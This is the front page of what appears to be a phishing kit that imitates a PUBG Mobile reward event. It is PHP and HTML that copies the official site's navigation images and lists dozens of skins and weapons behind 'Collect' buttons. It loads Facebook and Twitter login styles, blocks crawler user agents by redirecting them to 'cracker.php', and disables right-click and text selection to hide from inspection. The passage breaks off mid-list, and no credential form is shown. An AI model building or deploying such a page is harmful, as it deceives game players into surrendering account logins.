<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}
?>
<?php
// MENGAMBIL KONTROL
include("system/setting.php");
?>
<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="<?php echo $title;?>">
<meta name="description" content="<?php echo $description;?>">
<meta property="og:description" content="<?php echo $description;?>">
<meta property="og:url" content="./">
<meta property="og:site_name" content="<?php echo $title;?>">
<meta property="og:type" content="website">
<meta name="copyright"content="<?php echo $copyright;?>">
<meta name="theme-color" content="<?php echo $theme;?>">
<meta property="og:image" content="<?php echo $image;?>">
<title><?php echo $title;?></title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="css/login/facebook.css">
<link rel="stylesheet" href="css/login/twitter.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="<?php echo $icon;?>">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://i.postimg.cc/SxQ04Qn4/navbar-logo.png">
<div class="navbar-right">
<img class="navbar-shop" src="https://www.pubgmobile.com/en/images/nav_shop.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
<div class="navbar-download"><img src="https://www.pubgmobile.com/en/images/nav_download.svg"></div>
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="header">
<div class="slider">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- slider --->
</div> <!--- header --->
<div class="box">
<div class="menu-wrapper-border"></div>
<div class="menu-wrapper">
<div class="menu-content kanan" onmousedown="buka.play();" onclick="openRewards(event, 'other');">Other Reward</div>
<div class="menu-content kiri" onmousedown="buka.play();" onclick="openRewards(event, 'latest');" id="defaultTabRewards">Latest Reward</div>
<div class="menu-content tengah" onmousedown="buka.play();" onclick="openRewards(event, 'weapon');">Weapon Reward</div>
</div> <!--- menu-wrapper --->
<div class="tab_rewards" id="latest">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/89cRzxM/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/89cRzxM/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/bJX23rM/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/bJX23rM/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/KGHkcs8/6.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/KGHkcs8/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9r5gRgD/7.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9r5gRgD/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/W5BLK9Z/8.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/W5BLK9Z/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sCyL9Hb/9.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/sCyL9Hb/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/gZv6030/image.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/gZv6030/image.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/x5bybHC/2.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/x5bybHC/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mJwPfRC/3.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mJwPfRC/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S5PvF3m/4.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S5PvF3m/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/tXBHQtd/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tXBHQtd/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/C0rG8zv/11.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/C0rG8zv/11.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hw5G8L/12.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hw5G8L/12.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/6HyFpGG/13.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/6HyFpGG/13.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3dmRFXV/14.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3dmRFXV/14.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zx5GxjL/15.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zx5GxjL/15.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PhnrcY3/16.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PhnrcY3/16.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/g4z7tBb/17.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/g4z7tBb/17.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TTcnBSZ/18.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TTcnBSZ/18.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/t3P6YJy/19.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/t3P6YJy/19.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yRTzG0t/20.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yRTzG0t/20.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/VSqw4Dv/21.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/VSqw4Dv/21.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0qVLP3y/22.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0qVLP3y/22.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N6sBxhr/23.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N6sBxhr/23.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/bgkqhSD/24.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/bgkqhSD/24.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/PxpMQPv/25.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/PxpMQPv/25.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8gBrqKY/26.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8gBrqKY/26.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YWbBt80/27.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YWbBt80/27.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BtztTC9/28.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BtztTC9/28.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/4d0jxMk/29.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/4d0jxMk/29.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hxGSqCR/30.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hxGSqCR/30.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c6WSFLj/31.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c6WSFLj/31.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/yf3k2vw/32.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/yf3k2vw/32.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Zc4YWVk/33.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Zc4YWVk/33.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D52fbJC/34.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D52fbJC/34.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/T1yk8jX/35.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/T1yk8jX/35.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3kwbctw/36.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3kwbctw/36.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Fz96QgK/37.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Fz96QgK/37.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/TcHpPz1/38.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/TcHpPz1/38.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hXGJkjJ/39.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hXGJkjJ/39.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3F3vsBH/40.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3F3vsBH/40.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/J5bNTXt/41.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/J5bNTXt/41.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/FKjxq0p/42.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/FKjxq0p/42.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pbbpG2t/43.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pbbpG2t/43.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/D9XXLZs/44.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/D9XXLZs/44.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/xCXyt5Z/45.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/xCXyt5Z/45.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0h9Ytkz/46.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0h9Ytkz/46.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2SN4jPv/47.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2SN4jPv/47.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Thqqrh8/48.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Thqqrh8/48.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WK7qJN4/49.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WK7qJN4/49.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/QnnT6p0/50.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/QnnT6p0/50.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DzQh8wS/51.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DzQh8wS/51.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/2s05KNn/52.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/2s05KNn/52.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pKy2mNR/53.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pKy2mNR/53.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/BT3s0gQ/54.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/BT3s0gQ/54.jpg">Collect</button>
</div>
</div>

<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qdC5zHF/5.png">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qdC5zHF/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mTpf1bz/3.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mTpf1bz/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pd4MrC6/4.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pd4MrC6/4.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Xjjs6Mv/5.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Xjjs6Mv/5.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wwCwgFX/6.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wwCwgFX/6.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/sVkDgf7/8.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/sVkDgf7/8.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/7v7cDFb/9.jpg">
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/7v7cDFb/9.jpg">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="weapon">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/RT1tc10/image-12.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/RT1tc10/image-12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/5xvV1TP/m24.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/5xvV1TP/m24.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/fFQfP42/GR-7.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/fFQfP42/GR-7.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/wzmCg1L/a1.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/wzmCg1L/a1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jRZxtbP/a2.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jRZxtbP/a2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/NtHMgmF/a3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/NtHMgmF/a3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JK5QkCq/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JK5QkCq/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N1Kh4DJ/m249.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N1Kh4DJ/m249.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n0jsqH6/1.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n0jsqH6/1.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/tC7gGKh/2.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/tC7gGKh/2.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/HdCPbym/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/HdCPbym/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/zHXhQmQ/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/zHXhQmQ/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/hcnPCFM/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/hcnPCFM/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/S78nnmC/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/S78nnmC/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Lk3B2mw/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Lk3B2mw/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/YpbSGGN/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/YpbSGGN/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/54C3TwS/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/54C3TwS/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/8rwnBbf/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/8rwnBbf/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/JyKsRV9/3.jpg">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/JyKsRV9/3.jpg">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9NW5RBs/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9NW5RBs/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DrzYVS0/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DrzYVS0/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/3cM96Bn/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/3cM96Bn/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/30shkpG/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/30shkpG/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/DYcd3r8/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/DYcd3r8/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/m5MfkNp/6.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/m5MfkNp/6.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/0hG72h9/7.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/0hG72h9/7.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/c232k1x/8.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/c232k1x/8.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/smrqkwd/9.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/smrqkwd/9.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/stysM7v/10.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/stysM7v/10.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/WgYyGnw/11.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/WgYyGnw/11.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/pdYW33J/12.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/pdYW33J/12.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/N9XVcKh/13.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/N9XVcKh/13.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/X8Y41sj/14.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/X8Y41sj/14.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/mhWQMvq/15.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/mhWQMvq/15.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/Rjh4zr4/16.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/Rjh4zr4/16.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/qB0F8jV/17.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/qB0F8jV/17.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/n8pTPFf/18.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/n8pTPFf/18.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/rkkQqXM/20.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/rkkQqXM/20.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/jTsg4BQ/21.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/jTsg4BQ/21.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/v332bhy/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/v332bhy/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="https://i.ibb.co/9sw3NZK/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://i.ibb.co/9sw3NZK/5.png">Collect</button>
</div>
</div>
</center>
</div> <!--- scroll --->
</div> <!--- tab-rewards --->
<div class="tab_rewards" id="other">
<div class="scroll">
<center>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/1.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/1.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/2.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/2.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/3.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/3.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/4.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/4.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/5.png">
<div>
<button onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="img/rewards/5.png">Collect</button>
</div>
</div>
<div class="item">
<img style="border-bottom: 0px;" src="img/rewards/6.png">
<div>
